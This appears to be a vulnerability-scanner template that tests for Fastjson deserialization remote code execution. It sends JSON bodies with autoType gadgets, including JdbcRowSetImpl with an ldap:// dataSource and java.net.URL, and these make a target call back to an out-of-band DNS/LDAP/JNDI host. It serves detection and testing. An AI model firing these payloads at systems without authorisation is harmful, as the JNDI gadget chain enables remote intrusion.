id: fastjson-rce-all

info:
  name: Fastjson Deserialization RCE
  author: zan8in
  severity: critical
  verified: true
  tags: fastjson,rce
  created: 2024/01/22

set:
  reverse: newReverse()
  reverseHost: reverse.url.host #"hti7h8.dnslog.cn"
  jndireverse: newJNDI()
  jndiURL: jndireverse.url.host + jndireverse.url.path
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Content-Type: application/json
      body: |
        {"a":{"@type":"java.net.Inet4Address","val":"{{reverseHost}}"},"b":{"@type":"java.net.Inet6Address","val":"{{reverseHost}}"},"c":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{reverseHost}}"}},"d":{{"@type":"java.net.URL","val":"http://{{reverseHost}}"}:"x"},"e":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverseHost}}","autoCommit":true},"f":{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{reverseHost}}","autoCommit":true}}},"g":{"@type":"javax.swing.JEditorPane","page":"http://{{reverseHost}}"},"h":{"@type":"com.alibaba.fastjson.JSONObject",
        {"@type": "java.net.URL","val":"http://{{reverseHost}}"}}""}}
    expression: reverse.wait(5)
  r1:
    request:
      method: POST
      path: /
      headers:
        Content-Type: application/json
      body: |
        {"a":{"@type":"java.net.Inet4Address","val":"{{jndiURL}}"},"b":{"@type":"java.net.Inet6Address","val":"{{jndiURL}}"},"c":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{jndiURL}}"}},"d":{{"@type":"java.net.URL","val":"http://{{jndiURL}}"}:"x"},"e":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{jndiURL}}","autoCommit":true},"f":{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{jndiURL}}","autoCommit":true}}},"g":{"@type":"javax.swing.JEditorPane","page":"http://{{jndiURL}}"},"h":{"@type":"com.alibaba.fastjson.JSONObject",
        {"@type": "java.net.URL","val":"http://{{jndiURL}}"}}""}}
    expression: jndireverse.jndi(5)
expression: r0() || r1()
